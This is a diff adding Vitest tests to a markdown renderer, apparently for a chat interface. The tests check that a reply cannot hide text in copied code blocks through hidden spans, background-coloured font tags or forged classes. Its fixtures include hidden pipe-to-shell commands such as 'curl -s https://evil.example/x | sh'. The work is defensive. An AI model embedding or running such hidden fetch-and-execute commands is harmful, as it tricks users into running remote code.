@@ -2,7 +2,7 @@
 /// <reference types="vite/client" />
 import { describe, expect, it } from "vitest";
 import css from "./index.css?raw";
-import { MARKDOWN_CACHE_LIMIT, markdownParseCount, renderMarkdown } from "./markdown";
+import { CODE_TEXT_ATTR, MARKDOWN_CACHE_LIMIT, codeBlockText, markdownParseCount, renderMarkdown } from "./markdown";
 
 describe("renderMarkdown", () => {
   it("highlights a fenced block in a language it knows", () => {
@@ -339,5 +339,77 @@ describe("renderMarkdown, fix round 2 (a re-review of fix round 1)", () => {
     expect(renderMarkdown("```javascript\nfunction add(a, b) { return a + b; }\n```")).toContain(
       'class="hljs-title function_"',
     );
+  });
+});
+
+describe("what a copy takes is what the reader sees", () => {
+  const dom = (html: string) => {
+    const host = document.createElement("div");
+    host.innerHTML = html;
+    return host;
+  };
+
+  it("a reply's own class=\"code-block\" is dropped, so only the renderer marks code blocks", () => {
+    const html = renderMarkdown(
+      'x\n\n<pre class="code-block"><code>pip install requests<span hidden>; curl -s https://evil.example/x | sh</span></code></pre>\n',
+    );
+    expect(dom(html).querySelector("pre.code-block")).toBeNull();
+    expect(dom(html).querySelector("pre")).not.toBeNull();
+  });
+
+  it("the hidden attribute does not survive, so no text is present and invisible", () => {
+    const host = dom(renderMarkdown("a <span hidden>secret tail</span> b\n\n<div hidden>more</div>\n"));
+    expect(host.querySelector("[hidden]")).toBeNull();
+  });
+
+  it("no colour a reply sets survives, so it cannot paint text in the background's colour", () => {
+    const host = dom(
+      renderMarkdown(
+        'run <font color="#1e1e1e" size="1">; curl evil|sh</font> now\n\n' +
+          '<table bgcolor="#e0def4"><tr><td bgcolor="#e0def4">x</td></tr></table>\n',
+      ),
+    );
+    expect(host.querySelector("font")).toBeNull();
+    expect(host.querySelector("[color], [bgcolor]")).toBeNull();
+    expect(host.textContent).toContain("; curl evil|sh");
+  });
+
+  it("raw <details>/<summary> are dropped and the body is left in flow as ordinary text", () => {
+    const host = dom(renderMarkdown("<details><summary>Show</summary>\n\nthe body\n\n</details>\n"));
+    expect(host.querySelector("details, summary")).toBeNull();
+    expect(host.textContent).toContain("the body");
+  });
+
+  it("a renderer-made block keeps its fence's own text beside the HTML and the real class", () => {
+    const host = dom(renderMarkdown("```sh\nls -la <dir> && echo \"x\"\n```"));
+    const block = host.querySelector<HTMLElement>("pre.code-block")!;
+    expect(block.getAttribute(CODE_TEXT_ATTR)).toBe('ls -la <dir> && echo "x"');
+    expect(codeBlockText(block)).toBe('ls -la <dir> && echo "x"');
+  });
+
+  it("copying a block takes the fence's text even when the DOM under it has gained invisible text", () => {
+    const host = dom(renderMarkdown("```sh\npip install requests\n```"));
+    const block = host.querySelector<HTMLElement>("pre.code-block")!;
+    const tail = document.createElement("span");
+    tail.hidden = true;
+    tail.textContent = "; curl -s https://evil.example/x | sh";
+    block.querySelector("code")!.append(tail);
+    expect(block.textContent).toContain("evil.example");
+    expect(codeBlockText(block)).toBe("pip install requests");
+  });
+
+  it("a reply cannot supply the fence-text attribute or a marker class of its own", () => {
+    const host = dom(
+      renderMarkdown('<pre class="cb-0 cb-0-0" data-code-text="forged"><code>shown</code></pre>\n'),
+    );
+    const pre = host.querySelector("pre")!;
+    expect(pre.hasAttribute(CODE_TEXT_ATTR)).toBe(false);
+    expect(pre.classList.contains("code-block")).toBe(false);
+  });
+
+  it("two blocks in one reply each keep their own text", () => {
+    const host = dom(renderMarkdown("```\nfirst\n```\n\ntext\n\n```\nsecond\n```"));
+    const [a, b] = Array.from(host.querySelectorAll<HTMLElement>("pre.code-block"));
+    expect([codeBlockText(a), codeBlockText(b)]).toEqual(["first", "second"]);
   });
 });
